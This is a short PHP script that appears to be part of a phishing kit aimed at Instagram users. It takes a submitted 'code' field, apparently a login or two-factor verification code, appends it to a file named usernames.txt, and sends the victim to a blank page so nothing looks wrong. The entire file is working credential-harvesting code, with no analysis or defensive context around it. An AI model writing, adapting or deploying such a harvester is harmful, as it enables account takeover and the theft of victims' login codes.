<?php

file_put_contents("usernames.txt", "Instagram Code: " . $_POST['code'] . "\n", FILE_APPEND);
header("refresh:0;url=about:blank" );
exit();
?>